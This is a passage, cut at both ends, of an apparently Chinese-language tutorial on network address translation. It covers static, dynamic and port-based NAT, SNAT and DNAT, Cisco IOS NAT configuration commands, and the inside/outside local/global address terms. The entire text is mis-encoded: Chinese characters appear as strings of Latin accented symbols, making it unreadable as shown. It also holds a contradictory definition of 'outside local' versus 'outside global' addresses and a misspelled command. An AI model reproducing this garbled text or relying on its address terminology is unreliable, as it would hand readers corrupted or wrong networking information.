é‡ŒåŠ¨æ€çš„å–å‡ºä¸€ä¸ªå¤–ç½‘IPï¼Œå¹¶å°†ä»–ä»¬çš„å¯¹åº”å…³ç³»ç»‘å®šåˆ°NATè¡¨ä¸­ï¼Œ é€šä¿¡ç»“æŸåï¼Œè¿™ä¸ªå¤–ç½‘IPæ‰è¢«é‡Šæ”¾ï¼Œå¯ä¾›å…¶ä»–å†…éƒ¨IPåœ°å€è½¬æ¢ä½¿ç”¨ï¼Œè¿™ä¸ªDHCPç§Ÿçº¦IPæœ‰ç›¸ä¼¼ä¹‹å¤„ã€‚ å½“ISPæä¾›çš„åˆæ³•IPåœ°å€ç•¥å°‘äºç½‘ç»œå†…éƒ¨çš„è®¡ç®—æœºæ•°é‡æ—¶ã€‚å¯ä»¥é‡‡ç”¨åŠ¨æ€è½¬æ¢çš„æ–¹å¼ã€‚ ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢NAPTï¼ˆNetwork Address Port Translationï¼‰ï¼ˆPort-Level NATï¼‰ï¼ˆå¤šå¯¹ä¸€ï¼‰ã€‚ æ”¹å˜å¤–å‡ºæ•°æ®åŒ…çš„æºç«¯å£å¹¶è¿›è¡Œç«¯å£è½¬æ¢ï¼Œé‡‡ç”¨ç«¯å£å¤šè·¯å¤ç”¨æ–¹å¼ã€‚ å†…éƒ¨ç½‘ç»œçš„æ‰€æœ‰ä¸»æœºå‡å¯å…±äº«ä¸€ä¸ªåˆæ³•å¤–éƒ¨IPåœ°å€å®ç°å¯¹Internetçš„è®¿é—®ï¼Œå¯ä»¥æœ€å¤§é™åº¦åœ°èŠ‚çº¦IPåœ°å€èµ„æºã€‚ åŒæ—¶ï¼Œä¹Ÿå¯ä»¥éšè—ç½‘ç»œå†…éƒ¨çš„æ‰€æœ‰ä¸»æœºï¼Œæœ‰æ•ˆé¿å…æ¥è‡ªInternetçš„æ”»å‡»ã€‚ å› æ­¤ï¼Œç›®å‰ç½‘ç»œä¸­åº”ç”¨æœ€å¤šçš„å°±æ˜¯PATè§„åˆ™ã€‚è¿™æ˜¯æœ€å¸¸ç”¨çš„NATæŠ€æœ¯ï¼Œä¹Ÿæ˜¯IPv4èƒ½å¤Ÿç»´æŒåˆ°ä»Šå¤©çš„æœ€é‡è¦çš„åŸå› ä¹‹ä¸€ï¼Œ å®ƒæä¾›äº†ä¸€ç§å¤šå¯¹ä¸€çš„æ–¹å¼ï¼Œå¯¹å¤šä¸ªå†…ç½‘IPåœ°å€ï¼Œè¾¹ç•Œè·¯ç”±å¯ä»¥ç»™ä»–ä»¬åˆ†é…ä¸€ä¸ªå¤–ç½‘IPï¼Œ åˆ©ç”¨è¿™ä¸ªå¤–ç½‘IPçš„ä¸åŒç«¯å£å’Œå¤–éƒ¨è¿›è¡Œé€šä¿¡ã€‚ NAPT ä¸ åŠ¨æ€NAT ä¸åŒï¼Œå®ƒå°†å†…éƒ¨è¿æ¥æ˜ å°„åˆ°å¤–éƒ¨ç½‘ç»œä¸­çš„ä¸€ä¸ªå•ç‹¬çš„IPåœ°å€ä¸Šï¼ŒåŒæ—¶åœ¨è¯¥åœ°å€ä¸ŠåŠ ä¸Šä¸€ä¸ªç”±NATè®¾å¤‡é€‰å®šçš„ç«¯å£å·ã€‚ NAPTæ˜¯ä½¿ç”¨æœ€æ™®éçš„ä¸€ç§è½¬æ¢æ–¹å¼ï¼Œåœ¨HomeGWä¸­ä¹Ÿä¸»è¦ä½¿ç”¨è¯¥æ–¹å¼ã€‚ å®ƒåˆåŒ…å«ä¸¤ç§è½¬æ¢æ–¹å¼ï¼šSNATå’ŒDNATã€‚ æºNATï¼ˆSource NATï¼ŒSNATï¼‰ï¼šä¿®æ”¹æ•°æ®åŒ…çš„æºåœ°å€ã€‚ æºNATæ”¹å˜ç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„æ¥æºåœ°å€ï¼Œå®ƒæ°¸è¿œä¼šåœ¨æ•°æ®åŒ…å‘é€åˆ°ç½‘ç»œä¹‹å‰å®Œæˆï¼Œæ•°æ®åŒ…ä¼ªè£…å°±æ˜¯ä¸€å…·SNATçš„ä¾‹å­ã€‚ ç›®çš„NATï¼ˆDestination NATï¼ŒDNATï¼‰ï¼šä¿®æ”¹æ•°æ®åŒ…çš„ç›®çš„åœ°å€ã€‚ Destination NATåˆšå¥½ä¸SNATç›¸åï¼Œå®ƒæ˜¯æ”¹å˜ç¬¬ä¸€ä¸ªæ•°æ®æ‡ˆçš„ç›®çš„åœ°åœ°å€ï¼Œå¦‚å¹³è¡¡è´Ÿè½½ã€ç«¯å£è½¬å‘å’Œé€æ˜ä»£ç†å°±æ˜¯å±äºDNATã€‚ å¯¹äºç½‘ç»œåœ°å€è½¬æ¢æŠ€æœ¯æ¥è®²ï¼Œæœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨é…ç½® NAT çš„è·¯ç”±å™¨ä¸Šå½¢æˆäº† NAT è½¬æ¢è¡¨ï¼Œè¿™ä¸ªè½¬æ¢è¡¨çš„å½¢æˆæ˜¯éå¸¸å…³é”®çš„ã€‚ é…ç½® NAT åï¼Œèƒ½å½¢æˆæ­£ç¡®çš„è½¬æ¢è¡¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„å·¥ä½œå°±ç®—æˆåŠŸäº†ã€‚ NATçš„ä¸‰ä¸ªæ–¹å‘ NAT åœ¨outsideå£ç”Ÿæ•ˆï¼Œæ‰€æœ‰åœ¨insideå£éœ€è¦å…ˆè·¯ç”±,åœ¨outsideå£å…ˆnatã€‚ ip nat inside source: å°†å†…éƒ¨å±€éƒ¨åœ°å€è½¬æ¢ä¸ºå†…éƒ¨å…¨å±€åœ°å€;æ•°æ®æ–¹å‘inside->outside,åœ¨outsideä¸Šæ‰§è¡Œè½¬æ¢; ip nat inside destination: å°†å†…éƒ¨å…¨å±€åœ°å€è½¬æ¢ä¸ºå†…éƒ¨å±€éƒ¨åœ°å€;æ•°æ®æ–¹å‘outside->inside,åœ¨outsideä¸Šæ‰§è¡Œè½¬æ¢ ip nat outside source: å°†å¤–éƒ¨å…¨å±€åœ°å€è½¬æ¢ä¸ºå¤–éƒ¨å±€éƒ¨åœ°å€;æ•°æ®æ–¹å‘outside->inside,åœ¨outsideä¸Šæ‰§è¡Œè½¬æ¢; NATçš„åº”ç”¨åˆ†ç±» ip nat source é™æ€ natçš„æ˜ å°„ï¼šæ°¸è¿œä¸€ä¸ªipå¯¹åº”å¦å¤–ä¸€ä¸ªipã€‚ ip nat inside source static A.B.C.D A.B.C.D åŠ¨æ€ natçš„æ˜ å°„ï¼šæ¯æ¬¡ä¸€ä¸ªIPä¼šå¯¹åº”å¦å¤–ä¸€ä¸ªå…¬ç½‘çš„IPï¼› ip nat inside source list 2 pool qing åŠ¨æ€PATæ˜ å°„ï¼špoolé‡Œé¢åªæœ‰ä¸€ä¸ªIPã€‚ ip nat inside source list 2 pool qing overload é™æ€PATæ˜ å°„ï¼š ip nat inside source list 3 interface fastEthernet 0/0 overload ip nat inside destination tcpè´Ÿè½½å‡è¡¡ï¼Œå¤–ç½‘ä¸»åŠ¨å‘èµ·æµé‡è®¿é—®å†…ç½‘æœåŠ¡å™¨ã€‚åªç”¨åŠ¨æ€ï¼Œæ²¡æœ‰é™æ€ã€‚ ip nat inside destination list 10 pool feng ip nat outside source: å½“ä¸¤ç«¯åŒæ—¶åšnatæ—¢insideå’Œoutsideéœ€è¦åŒæ—¶ç¿»è¯‘å¹¶å‡ºç°åœ°å€å†²çªçš„æ—¶å€™éœ€è¦ç”¨outside sourceå’Œå…¶ä»–åŒæ—¶å‘½ä»¤åŒæ—¶å®ç°ã€‚ Ciscoè·¯ç”±å™¨é…ç½®3ä¸­NATçš„ä¸»è¦å‘½ä»¤ é™æ€NAT æŒ‡å®šNATå†…éƒ¨æ¥å£, åœ¨å†…ç½‘ç›¸åº”æ¥å£çš„æ¥å£é…ç½®æ¨¡å¼ä¸‹æ‰§è¡Œ: ip nat inside æŒ‡å®šNATå¤–éƒ¨æ¥å£, åœ¨å¤–ç½‘ç›¸åº”æ¥å£çš„æ¥å£é…ç½®æ¨¡å¼ä¸‹æ‰§è¡Œ: ip nat outside åœ¨å†…éƒ¨æœ¬åœ°åœ°å€ä¸å†…éƒ¨å…¨å±€åœ°å€ä¹‹é—´å»ºç«‹é™æ€åœ°å€è½¬æ¢å…³ç³»: ip nat insde source static å†…éƒ¨æœ¬åœ°åœ°å€ å†…éƒ¨å…¨å±€åœ°å€ åŠ¨æ€åœ°å€NAT æŒ‡å®šNATå†…éƒ¨æ¥å£, åœ¨å†…ç½‘ç›¸åº”æ¥å£çš„æ¥å£é…ç½®æ¨¡å¼ä¸‹æ‰§è¡Œ: ip nat inside æŒ‡å®šNATå¤–éƒ¨æ¥å£, åœ¨å¤–ç½‘ç›¸åº”æ¥å£çš„æ¥å£é…ç½®æ¨¡å¼ä¸‹æ‰§è¡Œ: ip nat outside åœ¨å…¨å±€é…ç½®æ¨¡å¼ä¸‹ï¼Œå®šä¹‰ä¸€ä¸ªæ ‡å‡†çš„access-listè§„åˆ™ï¼Œ å£°æ˜å…è®¸å“ªäº›å†…éƒ¨æœ¬åœ°åœ°å€å¯ä»¥è¿›è¡ŒåŠ¨æ€åœ°å€è½¬æ¢: access-list list-number permit æºåœ°å€ é€šé…ç¬¦ å…¶ä¸­ï¼Œlist-numberä¸º1ï¼99ä¹‹é—´çš„ä¸€ä¸ªä»»æ„æ•´æ•°ã€‚ åœ¨å…¨å±€é…ç½®æ¨¡å¼ä¸‹ï¼Œå®šä¹‰å†…éƒ¨å…¨å±€åœ°å€æ± : ip nat pool åœ°å€æ± å èµ·å§‹IPåœ°å€ ç»ˆæ­¢IPåœ°å€ netmask å­ç½‘æ©ç  å…¶ä¸­ï¼Œåœ°å€æ± åå¯ä»¥ä»»æ„è®¾å®šï¼Œä½†æœ€å¥½æœ‰ä¸€å®šçš„è¯´æ˜æ„ä¹‰ã€‚ åœ¨å…¨å±€é…ç½®æ¨¡å¼ä¸‹ï¼Œ å®šä¹‰ç¬¦åˆå…ˆå‰å®šä¹‰çš„access-listè§„åˆ™çš„IPæ•°æ®åŒ…ä¸å…ˆå‰å®šä¹‰çš„åœ°å€æ± ä¸­çš„IPåœ°å€è¿›è¡Œè½¬æ¢: ip nat inside source list list-number pool å†…éƒ¨å…¨å±€åœ°å€æ± å ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢NAPT æŒ‡å®šNATå†…éƒ¨æ¥å£, åœ¨å†…ç½‘ç›¸åº”æ¥å£çš„æ¥å£é…ç½®æ¨¡å¼ä¸‹æ‰§è¡Œ: ip nat inside æŒ‡å®šNATå¤–éƒ¨æ¥å£, åœ¨å¤–ç½‘ç›¸åº”æ¥å£çš„æ¥å£é…ç½®æ¨¡å¼ä¸‹æ‰§è¡Œ: ip nat outside åœ¨å…¨å±€é…ç½®æ¨¡å¼ä¸‹ï¼Œå®šä¹‰å†…éƒ¨å…¨å±€åœ°å€æ± : ip nat pool åœ°å€æ± å èµ·å§‹IPåœ°å€ ç»ˆæ­¢IPåœ°å€ netmask å­ç½‘æ©ç  å…¶ä¸­ï¼Œåœ°å€æ± åå¯ä»¥ä»»æ„è®¾å®šï¼Œä½†æœ€å¥½æœ‰ä¸€å®šçš„è¯´æ˜æ„ä¹‰ã€‚ åœ¨å…¨å±€é…ç½®æ¨¡å¼ä¸‹ï¼Œå®šä¹‰ä¸€ä¸ªæ ‡å‡†çš„access-listè§„åˆ™ï¼Œå£°æ˜å…è®¸å“ªäº›å†…éƒ¨æœ¬åœ°åœ°å€å¯ä»¥è¿›è¡Œå¤ç”¨åœ°å€è½¬æ¢: access-list list-number permit æºåœ°å€ é€šé…ç¬¦ å…¶ä¸­ï¼Œlist-numberä¸º1ï¼99ä¹‹é—´çš„ä¸€ä¸ªä»»æ„æ•´æ•°ã€‚ åœ¨å…¨å±€é…ç½®æ¨¡å¼ä¸‹ï¼Œå®šä¹‰ç¬¦åˆå…ˆå‰å®šä¹‰çš„access-listè§„åˆ™çš„IPæ•°æ®åŒ…ä¸å…ˆå‰å®šä¹‰çš„åœ°å€æ± ä¸­çš„IPåœ°å€è¿›è¡Œå¤ç”¨åœ°å€è½¬æ¢: ip nat inside source list list-number pool å†…éƒ¨å…¨å±€åœ°å€æ± å overload å·¥ä½œåŸç† äº†è§£åŸç†ä¹‹å‰å…ˆäº†è§£ä¸‹NAT æœ¯è¯­ã€‚ åœ¨é…ç½®äº† NAT çš„è·¯ç”±å™¨ä¸Šï¼Œå¯ä»¥æŠŠæ•´ä¸ªç½‘ç»œåˆ†æˆä¸¤éƒ¨åˆ†ï¼šå†…éƒ¨ç½‘ç»œ å’Œ å¤–éƒ¨ç½‘ç»œã€‚ NAT æŠ€æœ¯ä¸­æœ‰å››ä¸ªæœ¯è¯­ï¼š å†…éƒ¨æœ¬åœ°åœ°å€ï¼ˆInside Localï¼‰ï¼šå†…ç½‘ä¸­è®¾å¤‡æ‰€ä½¿ç”¨çš„IPåœ°å€ å†…éƒ¨å…¨å±€åœ°å€ï¼ˆInside Globalï¼‰ï¼šå¯¹äºå¤–éƒ¨ç½‘ç»œæ¥è¯´ï¼Œå±€åŸŸç½‘å†…éƒ¨ä¸»æœºæ‰€è¡¨ç°çš„ IP åœ°å€ã€‚ å¤–éƒ¨æœ¬åœ°åœ°å€ï¼ˆOutside Localï¼‰ï¼šå¤–éƒ¨ç½‘ç»œä¸»æœºçš„çœŸå®åœ°å€ã€‚ å¤–éƒ¨å…¨å±€åœ°å€ï¼ˆOutside Globalï¼‰ï¼šå¯¹äºå†…éƒ¨ç½‘ç»œæ¥è¯´ï¼Œå¤–éƒ¨ç½‘ç»œä¸»æœºæ‰€è¡¨ç°çš„ IP åœ°å€ã€‚å¤–ç½‘è®¾å¤‡æ‰€ä½¿ç”¨çš„çœŸæ­£çš„åœ°å€ã€‚ local ã€global æ˜¯ç›¸å¯¹äºç«¯å£çŠ¶æ€è¯´çš„ï¼Œlocalæ˜¯insideéƒ¨åˆ†å¯ä»¥è¢«è·¯ç”±çš„ï¼Œglobalæ˜¯outsideéƒ¨åˆ†å¯ä»¥è¢«è·¯ç”±çš„ã€‚ ç½‘ç»œåœ°å€è½¬æ¢å¸¸å¸¸å’Œä»£ç†æœåŠ¡ææ··ï¼Œä½†æ˜¯å®ƒä»¬ä¹‹é—´æœ‰æ˜ç¡®çš„ä¸åŒã€‚NAT å¯¹æºå’Œç›®çš„è®¡ç®—æœºéƒ½æ˜¯é€æ˜çš„ã€‚ æ²¡æœ‰ä»»ä½•ä¸€æ–¹ä¼šæ„è¯†åˆ°å®ƒæ­£åœ¨å’Œç¬¬ä¸‰æ–¹è®¾å¤‡æ‰“äº¤é“ã€‚ä½†æ˜¯ä»£ç†æœåŠ¡å´ä¸æ˜¯é€æ˜çš„ã€‚ æºè®¡ç®—æœºçŸ¥é“å®ƒæ­£å‘ä»£ç†æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œè€Œä¸”ä½ è¿˜å¿…é¡»è¿›è¡Œé…ç½®æ‰èƒ½è¿™æ ·åšã€‚ ç›®çš„è®¡ç®—æœºä¼šè®¤ä¸ºä»£ç†æœåŠ¡å™¨å°±æ˜¯ä¸å®ƒç›´æ¥é€šä¿¡çš„æºè®¡ç®—æœºã€‚ è¿˜æœ‰ï¼Œä»£ç†æœåŠ¡é€šå¸¸å·¥ä½œåœ¨ OSI å‚è€ƒæ¨¡å‹çš„ç¬¬ 4 å±‚ (ä¼ è¾“å±‚) æˆ–æ›´é«˜ï¼Œè€Œ NAT å·¥ä½œåœ¨ç¬¬ 3 å±‚ (ç½‘ç»œå±‚)ã€‚ ç”±äºä»£ç†æœåŠ¡å·¥ä½œåœ¨æ›´é«˜å±‚ï¼Œæ‰€ä»¥é€šå¸¸å®ƒå°†æ¯” NAT è¦æ…¢ã€‚ NAT å·¥ä½œåœ¨ OSI å‚è€ƒæ¨¡å‹çš„ç½‘ç»œå±‚ (ç¬¬3å±‚) æ˜¯æœ‰é“ç†çš„ï¼Œå› ä¸ºè·¯ç”±å™¨å°±å·¥ä½œåœ¨è¿™ä¸€å±‚ï¼š NAT åŸç† NATè®¾å¤‡ç»´æŠ¤ä¸€ä¸ªçŠ¶æ€è¡¨ï¼Œç”¨æ¥æŠŠéæ³•çš„IPåœ°å€æ˜ å°„åˆ°åˆæ³•çš„IPåœ°å€ä¸Šå»ã€‚ æ¯ä¸ªåŒ…åœ¨NATè®¾å¤‡ä¸­éƒ½è¢«ç¿»è¯‘æˆæ­£ç¡®çš„IPåœ°å€ï¼Œå‘å¾€ä¸‹ä¸€çº§ï¼Œè¿™æ„å‘³ç€ç»™å¤„ç†å™¨å¸¦æ¥äº†ä¸€å®šçš„è´Ÿæ‹…ã€‚ ä½†å¯¹äºä¸€èˆ¬çš„ç½‘ç»œæ¥è¯´ï¼Œè¿™ç§è´Ÿæ‹…æ˜¯å¾®ä¸è¶³é“çš„ã€‚ åœ¨è¿è¡ŒNATçš„è·¯ç”±å™¨ä¸­ï¼Œå½“æ•°æ®åŒ…è¢«ä¼ é€æ—¶ï¼ŒNATå¯ä»¥è½¬æ¢æ•°æ®åŒ…çš„IPåœ°å€å’ŒTCP/UDPæ•°æ®åŒ…çš„ç«¯å£å·ã€‚ è®¾ç½®NATåŠŸèƒ½çš„è·¯ç”±å™¨è‡³å°‘è¦æœ‰ä¸€ä¸ªInsideï¼ˆå†…éƒ¨ï¼‰ç«¯å£å’Œä¸€ä¸ªOutsideï¼ˆå¤–éƒ¨ï¼‰ç«¯å£ã€‚ å†…éƒ¨ç«¯å£è¿æ¥å†…ç½‘çš„ç”¨æˆ·ï¼Œå¤–éƒ¨ç«¯å£ä¸€èˆ¬è¿æ¥åˆ°Internetã€‚ å½“IPæ•°æ®åŒ…ç¦»å¼€å†…éƒ¨ç½‘ç»œæ—¶ï¼ŒNATè´Ÿè´£å°†å†…ç½‘IPæºåœ°å€ï¼ˆé€šå¸¸æ˜¯ä¸“ç”¨åœ°å€ï¼‰è½¬æ¢ä¸ºåˆæ³•çš„å…¬å…±IPåœ°å€ã€‚ å½“IPæ•°æ®åŒ…è¿›å…¥å†…ç½‘æ—¶ï¼ŒNATå°†åˆæ³•çš„å…¬å…±IPç›®çš„åœ°å€è½¬æ¢ä¸ºå†…ç½‘çš„IPæºåœ°å€ã€‚ NATçš„åŸºæœ¬å·¥ä½œåŸç†æ˜¯ï¼šå½“ç§æœ‰ç½‘ä¸»æœºå’Œå…¬å…±ç½‘ä¸»æœºé€šä¿¡çš„IPåŒ…ç»è¿‡NATç½‘å…³æ—¶ï¼Œå°†IPåŒ…ä¸­çš„æºIPæˆ–ç›®çš„IPåœ¨ç§æœ‰IPå’ŒNATçš„å…¬å…±IPä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚ å½“å†…éƒ¨ç½‘ç»œä¸­çš„ä¸€å°ä¸»æœºæƒ³ä¼ è¾“æ•°æ®åˆ°å¤–éƒ¨ç½‘ç»œæ—¶ï¼Œå®ƒå…ˆå°†æ•°æ®åŒ…ä¼ è¾“åˆ°NATè·¯ç”±å™¨ä¸Šï¼Œè·¯ç”±å™¨æ£€æŸ¥æ•°æ®åŒ…çš„æŠ¥å¤´ï¼Œ è·å–è¯¥æ•°æ®åŒ…çš„æºIPä¿¡æ¯ï¼Œå¹¶ä»å®ƒçš„NATæ˜ å°„è¡¨ä¸­æ‰¾å‡ºä¸è¯¥IPåŒ¹é…çš„è½¬æ¢æ¡ç›®ï¼Œ ç”¨æ‰€é€‰ç”¨çš„å†…éƒ¨å…¨å±€åœ°å€ï¼ˆå…¨çƒå”¯ä¸€çš„IPåœ°å€ï¼‰æ¥æ›¿æ¢å†…éƒ¨å±€éƒ¨åœ°å€ï¼Œå¹¶è½¬å‘æ•°æ®åŒ…ã€‚ å½“å¤–éƒ¨ç½‘ç»œå¯¹å†…éƒ¨ä¸»æœºè¿›è¡Œåº”ç­”æ—¶ï¼Œæ•°æ®åŒ…è¢«é€åˆ°NATè·¯ç”±å™¨ä¸Šï¼Œè·¯ç”±å™¨æ¥æ”¶åˆ°ç›®çš„åœ°å€ä¸ºå†…éƒ¨å…¨å±€åœ°å€çš„æ•°æ®åŒ…åï¼Œ å®ƒå°†ç”¨å†…éƒ¨å…¨å±€åœ°å€é€šè¿‡NATæ˜ å°„è¡¨æŸ¥æ‰¾å‡ºå†…éƒ¨å±€éƒ¨åœ°å€ï¼Œç„¶åå°†æ•°æ®åŒ…çš„ç›®çš„åœ°å€æ›¿æ¢æˆå†…éƒ¨å±€éƒ¨åœ°å€ï¼Œå¹¶å°†æ•°æ®åŒ…è½¬å‘åˆ°å†…éƒ¨ä¸»æœºã€‚ å…¶å®ä¸»è¦å°±æ˜¯ ä¿®æ”¹ IP æ•°æ®åŒ…ä¸­çš„æº IP åœ°å€ï¼Œæˆ–ç›®çš„ IP åœ°å€ã€‚ ä¸»è¦ç›®çš„æ˜¯æŠŠ RFC1918æ‰€æè®®çš„ç§æœ‰åœ°å€è½¬å˜æˆåœ¨ Internet ä¸Šå¯è·¯ç”±çš„å…¬æœ‰åˆæ³•åœ°å€ã€‚ å¯¹äºæŸäº›æœ‰é™çš„åº”ç”¨ï¼ˆå¦‚ DNSã€ FTP ç­‰ï¼‰ï¼Œå®ƒä¹Ÿå¯ä»¥ä¿®æ”¹ IP æ•°æ®åŒ…æœ‰æ•ˆè½½è·ä¸­çš„åœ°å€ã€‚ ç”±äºåº”ç”¨çš„å¤æ‚æ€§ï¼Œ NAT ç›®å‰æ”¯æŒçš„åº”ç”¨æœ‰é™ï¼Œå½“ç„¶ï¼Œå¦‚æœéœ€è¦ï¼Œå®Œå…¨å¯ä»¥é’ˆå¯¹æ–°çš„åº”ç”¨åšç›¸åº”çš„å¼€å‘å·¥ä½œã€‚ æ€»ä½“æ¥è¯´ï¼ŒNATè¿›è¡Œåœ°å€è½¬æ¢çš„è¿‡ç¨‹å°±æ˜¯\"æœ¬åœ°åœ°å€\"ä¸\"å…¨å±€åœ°å€\"ä¹‹é—´çš„è½¬æ¢è¿‡ç¨‹ï¼Œæ— è®ºæ•°æ®åŒ…æ˜¯ä»å†…éƒ¨ç½‘ç»œå‘å¾€å¤–éƒ¨ç½‘ç»œï¼Œè¿˜æ˜¯ä»å¤–éƒ¨ç½‘ç»œå‘å¾€å†…éƒ¨ç½‘ç»œã€‚ ä¸åŒçš„åªæ˜¯æœ¬åœ°åœ°å€å’Œå…¨å±€åœ°å€æ‰€å¯¹åº”çš„ç½‘ç»œä¸åŒï¼Œä»¥åŠæ•°æ®åŒ…é‡æ–°å°è£…çš„æºå’Œç›®çš„åœ°å€ä¸åŒã€‚å…·ä½“å¦‚å›¾æ‰€ç¤ºã€‚ NATåŸºæœ¬åœ°å€è½¬æ¢åŸç† è¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡NATä¸­çš„æœ¬åœ°å€ä¸å…¨å±€åœ°å€æ˜ å°„æ¡ç›®æ¥å®ç°çš„ï¼Œæ‰€ä»¥äº‹å…ˆè¦åœ¨NATè·¯ç”±å™¨ä¸Šé…ç½®è¿™æ ·çš„æ˜ å°„æ¡ç›®ã€‚ NATä¸­çš„è½¬æ¢æ–¹å¼ ä»å†…ç½‘ä¸­è®¾å¤‡ä¸Šå‘å‡ºçš„IPåŒ…æ˜¯ä»¥\"inside local address\"ä½œä¸ºæºåœ°å€ï¼Œä»¥\"outside local address\"ä½œä¸ºç›®çš„åœ°å€ã€‚ å½“æ•°æ®åŒ…åˆ°è¾¾NATè®¾å¤‡çš„\"inside\"æ¥å£åï¼Œåœ°å€åˆ†åˆ«è¢«ç¿»è¯‘æˆ\"inside global address\"å’Œ\"outside global address\"å¹¶ä»\"outside\"æ¥å£é€å‡ºã€‚ å¤–ç½‘è®¾å¤‡ä¸Šå‘å‡ºçš„IPåŒ…ä»¥\"outside global address\"ä½œä¸ºæºåœ°å€ï¼Œä»¥\"inside global address\"ä½œä¸ºç›®çš„åœ°å€ã€‚ å½“æ•°æ®åŒ…åˆ°è¾¾NATè®¾å¤‡çš„\"outside\"æ¥å£åï¼Œåœ°å€åˆ†åˆ«è¢«ç¿»è¯‘æˆ\"outside local address\"å’Œ\"inside local address\"å¹¶ä»\"inside\"æ¥å£é€å‡ºã€‚ å½“å†…éƒ¨ç½‘ç»œç”¨æˆ·è®¿é—®å¤–éƒ¨ç½‘ç»œæ—¶ï¼Œæ‰€è¿›è¡Œçš„æ˜¯\"å†…éƒ¨æœ¬åœ°åœ°å€\"å’Œ\"å†…éƒ¨å…¨å±€åœ°å€\"ä¹‹é—´çš„è½¬æ¢ã€‚ åœ¨NATè·¯ç”±å™¨æ¥æ”¶åˆ°æ¥è‡ªå†…éƒ¨ç½‘ç»œä¸»æœºå‘é€çš„æ•°æ®åŒ…æ—¶ï¼Œå…¶æºIPåœ°å€ï¼ˆSAï¼‰ä¸º\"å†…éƒ¨æœ¬åœ°åœ°å€\"ï¼Œç›®çš„IPåœ°å€ï¼ˆDAï¼‰ä¸º\"å¤–éƒ¨æœ¬åœ°åœ°å€\"ã€‚ å½“æ•°æ®åŒ…è¢«è½¬å‘åˆ°å¤–éƒ¨ç½‘ç»œæ—¶ï¼Œæ•°æ®åŒ…çš„æºIPåœ°å€ï¼ˆSAï¼‰å°±ä¼šè½¬å˜ä¸º\"å†…éƒ¨å…¨å±€åœ°å€\"ï¼Œè€Œç›®çš„IPåœ°å€ï¼ˆDAï¼‰è¢«è½¬å˜ä¸º\"å¤–éƒ¨å…¨å±€åœ°å€\"ã€‚ ä¹Ÿå°±æ˜¯æŠŠæ•°æ®åŒ…çš„æ‰€æœ‰æºIPåœ°å€ï¼ˆSAï¼‰å’Œç›®çš„IPåœ°å€ï¼ˆDAï¼‰å…¨éƒ¨ç”±æœ¬åœ°åœ°å€è½¬æ¢ä¸ºå…¨å±€åœ°å€ã€‚å¦‚å›¾6-9ä¸Šéƒ¨åˆ†æ•°æ®åŒ…IPåœ°å€è½¬æ¢ç¤ºæ„å›¾ã€‚ ç›¸åï¼Œå½“å¤–éƒ¨ç½‘ç»œç”¨æˆ·è®¿é—®å†…éƒ¨ç½‘ç»œæ—¶ï¼Œæ‰€è¿›è¡Œçš„æ˜¯\"å¤–éƒ¨æœ¬åœ°åœ°å€\"å’Œ\"å¤–éƒ¨å…¨å±€åœ°å€\"ä¹‹é—´çš„è½¬æ¢ã€‚ åœ¨NATè·¯ç”±å™¨æ¥æ”¶åˆ°æ¥è‡ªå¤–éƒ¨ç½‘ç»œä¸»æœºå‘é€çš„æ•°æ®åŒ…æ—¶ï¼Œå…¶æºIPåœ°å€ï¼ˆSAï¼‰å°±æ˜¯\"å¤–éƒ¨å…¨å±€åœ°å€\"ï¼Œç›®çš„IPåœ°å€ï¼ˆDAï¼‰å°±æ˜¯\"å†…éƒ¨å…¨å±€åœ°å€\"ã€‚ ç›¸å½“äºç”±å†…éƒ¨ç½‘ç»œå‘å¤–éƒ¨ç½‘ç»œå‘é€æ•°æ®åŒ…æ—¶æ•°æ®åŒ…ä¸­çš„æºIPåœ°å€ï¼ˆSAï¼‰å’Œç›®çš„IPåœ°å€ï¼ˆDAï¼‰çš„äº’æ¢ã€‚ è€Œå½“æ•°æ®åŒ…è¢«è·¯ç”±å™¨è½¬å‘åˆ°æœ¬åœ°ç½‘ç»œæ—¶ï¼ŒæºIPåœ°å€ï¼ˆSAï¼‰è¢«è½¬å˜ä¸º\"å¤–éƒ¨æœ¬åœ°åœ°å€\"ï¼Œç›®çš„IPåœ°å€ï¼ˆDAï¼‰è¢«è½¬å˜ä¸º\"å†…éƒ¨æœ¬åœ°åœ°å€\"ï¼Œ ä¹Ÿç›¸å½“äºç”±å†…éƒ¨ç½‘ç»œå‘å¤–éƒ¨ç½‘ç»œå‘é€æ•°æ®åŒ…æ—¶æ•°æ®åŒ…ä¸­çš„æºIPåœ°å€ï¼ˆSAï¼‰å’Œç›®çš„IPåœ°å€ï¼ˆDAï¼‰çš„äº’æ¢ã€‚å¦‚å›¾6-9ä¸‹éƒ¨åˆ†æ•°æ®åŒ…IPåœ°å€è½¬æ¢ç¤ºæ„å›¾ NATåŸºæœ¬IPåœ°å€è½¬æ¢åŸç† ä»¥ä¸Šæ˜¯ä»æ€»ä½“ä¸Šä»‹ç»NATçš„IPåœ°å€è½¬æ¢åŸç†çš„ï¼Œå®é™…NATåº”ç”¨æœ‰æ—¶å¹¶ä¸éœ€è¦å¯¹æºIPåœ°å€å’ŒIPåœ°å€è¿›è¡Œå…¨é¢æ›¿æ¢ï¼Œ ä»…éœ€è¦å¯¹æºIPåœ°å€æˆ–è€…ä»…éœ€è¦å¯¹ç›®çš„IPåœ°å€è¿›è¡Œè½¬æ¢å³å¯è¾¾åˆ°æ‰€éœ€çš„ç›®çš„ã€‚ ä¸‹é¢äºˆä»¥ä»‹ç»ã€‚ å†…éƒ¨åœ°å€NATè½¬æ¢åŸç† å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨NATçš„ç›®çš„å°±æ˜¯ä¸ºäº†ä½¿å†…éƒ¨ç½‘ç»œä¸­çš„å¤šä¸ªç”¨æˆ·èƒ½ä½¿ç”¨ä¸€ä¸ªæ³¨å†ŒIPåœ°å€è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œæ‰€ä»¥ä»…éœ€è¦é…ç½®å†…éƒ¨åœ°å€NATè½¬æ¢ã€‚ å³é€šè¿‡ip nat inside 